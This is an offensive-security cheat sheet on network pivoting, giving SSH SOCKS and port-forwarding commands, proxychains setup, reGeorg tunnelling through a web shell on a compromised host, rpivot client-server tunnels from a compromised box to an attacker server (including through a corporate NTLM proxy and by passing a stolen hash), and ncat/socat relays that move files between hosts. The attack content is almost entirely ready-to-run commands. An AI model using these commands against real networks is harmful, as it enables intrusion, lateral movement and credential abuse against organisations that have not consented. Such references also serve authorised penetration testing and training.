# Network Pivoting Techniques

## SSH

### SOCKS Proxy
```
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

### Local Port Forwarding
```
ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
```


### Remote Port Forwarding
```
ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
```

## Proxychains
**Config file**: /etc/proxychains.conf
```bash
[ProxyList]
socks4 localhost 8080
```
Set the SOCKS4 proxy then `proxychains nmap 192.168.5.6`

## Web SOCKS - reGeorg
```
python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp
```

## Rpivot

Server (Attacker box)
```python
python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0
```

Client (Compromised box)
```python
python client.py --server-ip <ip> --server-port 9443
```

Through corporate proxy
```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

Passing the hash
```python
python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \
--ntlm-proxy-port 8080 --domain CORP --username jdoe \
--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE
```


## Basic Pivoting Types
| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| Listen - Listen   | Exposed asset, may not want to connect out. |
| Listen - Connect  | Normal redirect.                            |
| Connect - Connect | Can’t bind, so connect to bridge two hosts  |


## Listen - Listen
| Type              | Use Case                                    |
| :-------------    | :------------------------------------------ |
| ncat              | `ncat -v -l -p 8080 -c "ncat -v -l -p 9090"`|
| socat             | `socat -v tcp-listen:8080 tcp-listen:9090`  |
| remote host 1     | `ncat localhost 8080 < file`                |
| remote host 2     | `ncat localhost 9090 > newfile`             |


## Listen - Connect
| Type              | Use Case                                                        |
| :-------------    | :------------------------------------------                     |
| ncat              | `ncat -l -v -p 8080 -c "ncat localhost 9090"`                   |
| socat             | `socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat localhost -p 8080 < file`                                 |
| remote host 2     | `ncat -l -p 9090 > newfile`                                     |


## Connect - Connect
| Type              | Use Case                                                                   |
| :-------------    | :------------------------------------------                                |
| ncat              | `ncat localhost 8080 -c "ncat localhost 9090"`                             |
| socat             | `socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090` |
| remote host 1     | `ncat -l -p 8080 < file                                                    |
| remote host 2     | `ncat -l -p 9090 > newfile`                                                |


## Thanks to
 * [Network Pivoting Techniques - Bit rot](https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
